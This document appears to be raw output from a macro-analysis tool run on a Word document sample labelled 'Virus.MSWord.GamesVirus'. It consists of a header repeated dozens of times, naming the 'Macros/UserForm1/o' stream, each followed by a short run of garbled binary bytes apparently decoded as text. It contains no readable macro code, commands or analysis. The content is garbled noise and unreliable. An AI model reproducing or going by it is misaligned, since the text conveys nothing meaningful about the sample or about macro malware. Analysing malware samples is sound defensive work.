- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba<c�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BaFs�<c�3Zy4cy*Ri3Zq)Ja BY*Ri2Rq BY Ba<cy)Ji)Ji3Zq)Ja1Ji<c�(Ba)Ji3Zy<c� Ba*Ri)Ja(BY*Rq2Rq4cq*Ri2Ri*Ri*Rq)Ji BY(Ba+Zq2RiDc�&1Q2Rq BY)Ja BY(BY BY'9Q)Ji)Ja)Ji*Ri BY BY BY(Ba(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I)Ji)Ja BY(BY2Rq)Ja'9Q*Ri'9Q)Ja'9I'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BA)Ja3Zy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I3Zy2Rq3Zy)Ji2Rq)Ji2RqEk�3Zy1Ji3Zy'9Y'9Q)Ja BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I;Zy2Rq3ZiDc�'9Q3Zy)Ja BY3Zy;Zy)Ja<c�*Rq3Zy;Zy3Zq;Zy BY*Ri2Rq2Ri2Rq2Rq2Rq2Rq2Rq&1Y;Zy!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Bi2Ri BY;Zy1Ji(BY)Ji3Zq;Z�)Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji)Jq(BY(Ba2Rq(BY)Ji3Zq'9Y BY<c�;Z�;Zy2Ry3Zy3Zy)Ji<c�)Ja2Rq;Zy Bi'9Y BY BY2Rq2Rq3Zy2Rq1Ji0BYDcy2Ri)JaDcy*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a<c�+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QVs�*Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba;Zq3Zq3Zy)Ji)Ja)Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji2Rq)JaEk� BY<c�)Ji*Ri2Rq)Ji*Rq1Jq1Ji)Ji2Rq)Ji3Zy2Rq2Ri)Ji2Rq)Ja(Ba2Rq)Ji<c�*Ri)Ja1Ji<c�Ek�)Ji2Ri)Ji BY)Ji2Rq)Ji;Zy)Ji=k� BY Ba(Ba(Ba(Ba(Ba1Ji BY(Ba2Rq(Ba(Ba)Ji(BY'9Q3Zq'9Q)Ji)Ja'9Q BY2Rq&1IFs�Ns�Ek�Ek�h��W{�Vs�W{�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1($! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ji3Zy3Zq=ky BY<c�)Ji*Ri BY BY)Ji(Ba2Rq2Rq)Ja!Ja BY BY2Rq2Rq)Ji<c�2Rq(Ba2Rq2Rq BY2Rq'9Q2Rq Ba BY2Rq)JY BY!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y+Zq*Rq*Ri)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ2RY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY'9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Ri;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A2Rq(Ba(BY2Rq;Z� BQ'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1IDc�Ek�Dc�Ek�<c� BY Ba Ba'9Q)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq*Rq)Ji2Rq*Ri)Ji;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY3ZyDc�)Ja)Ji)Ji)Ji2Ry)Ji)Ji3Zy2Rq BY<c�)Ji2Rq2Rq<cy1Ji*Rq3Zy)Ji!Ja!Ja;Zq*Ri BY)Ja)Ji)Ji)Ja2Rq)Ji BY<c�)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja)Ja3Zq;Z�)Ji)Ji1Ji;Zy<c�)Ja*Rq)Ji*Rq)Ji)Ji*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY)Ji BY'9Q BY*Ri2Rq<c�)Ja1Ji(Ba2RqDcy<c�=k� BY3Zi<c�=k�<cy2Ri3ZqO{�i��r��O{�O{�W{�W{�W{�i��O{�<c�Ek�Fs�Ns�h��Ns�`��i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! *Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Jq;Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY3Zy+Zq Bi4c�1Ji1Ji3Zy<c�(Ba BY Ba2Rq'9Q&1I/9Q)JaEk�3Zy2Rq<cy)Ji(Ba;Zy BY(Ba Ba)Ja BY=k� Ba Ba)Ja;Zy)Ja)Ji1Ji'9Q;Z�)Jansyx��DcqG{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c� BY1Ji2Rq2Rq2Rq)Ji)Ja2Rq3Zy1Ji)Ji2Ri3Zq Ba;Zy'9Y2Rq)Ji;Zy BY)Ji=k�)JiEk�2RqNs�<c�(BY1Ji2Rq*Ri=k�*Ri5k�O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BQ&1IH��Y��G{�X��Y��i��b��a��X��a��Y��P��_{�i��i��i��H��W{�W{�a��P��X��H��P��G{�Fs�P��=k�i��i��Q��a��X��<c�Fs�=k�Fs�Dc�Ek�G{�Fs�Ns�_{�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(AJI+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IJA'9Q&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(Ba2Ri<c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BQ:Ra1JQ:RY)JQUkiLciDciUkqg{�^syNsyCZa)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9IW{�X��`��P��H��I��O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1INs�r��r��H��H��H��X��Ek�5k�=k�4cqW{�W{�Ns�)JY<c�5kyr��X��H��i��G{�G{�3Zy<c�Vs�4c�W{�W{�_{�q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
798=)0#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! .1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Z�(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0{q$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fs�$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.18.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q<ciMky'9QFs�Fs�W{�Ns�Fs�Vs�W{�G{�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(BiO{�X��a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�j��i��H��!Ja!Ji!Ji+Zq4cy3Z�*RiEk�Ekq,cy!JY4cq=k�G{�?{�b��Ns�a��`��Ek�O{�{��O{�W{�`��a��q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(.1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %) -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! -)0#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 -)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(-)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($! $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\ci BY2Ri2Rq'9Y���)Ji-)0IJI%)(Mk�Vs�i��Ns�=k�<c�=k�3Z�3Z�a��j��j��&1Qa��a��2Rq BY*Rq)Ji!Ja Bi+Zi*Ri*Ri3Zq;ZiDcq!JYNs�W{�{��I��Y��=k�<c�@��i��4cyEk�Vs�Ns�Fs�X��Eky
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) .1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�eki3ZqNsy;Zq)Ji��� BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi^syDcyVs�_{�Vs�Ek�Ns�=k�G{�4c�3Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Ai��`��(BQMk�;Zy)Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba3ZqW{�<c�+Zq<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaNs�O{�X��Fs�P��W{�H��O{�O{�Fs�G{�Mky:Ra3ZqDcqVsy`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! %) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! SZY^sq]kq.18AJInsyfsq^s�79Ah�����h��]kqw{�o{yy�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ5k�TcaSZip��BRQ]kqy�����������JRQfsy_{�g{yfsyh��p�yw{�\ciAJIKZY]kinsyo{qekq\cafsyz��s��z��RRQnsq]kqo{�\ci\cqSZag{ySZY\cqfsq\cqfsy^sy2Rq]kq61(HB8)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ekqSZY^s�z��`��g{�fsyh��g{�KZansyq��o{�]kqp��y��9JIfsyp��o{qAJI\ci���h��h��o{�o{�\cq79ABRQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SZip��p��y��p��AJI���nsqw{yKZaTca0BAJRQTciTci]kiSZaRRiSZYKZYAJQSZaekqp��o{q798]kqPB8ZRA4c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�3Zqa��W{�DcqW{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!AUk�Dcq^s�_{�=k�Fs�O{�`��H��a��0��Mk�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(:RiDc�)Ji3Zq Ba*Ri2Ry3Zq=k�4cyNs�*Rq3ZqNs�W{�Ns�>s�a��r��i��j��z��a��q��`��_{�X��)Ji BY;ZaMkyY��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Zq5k�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4c�$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A)Ji*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! .1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! -)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
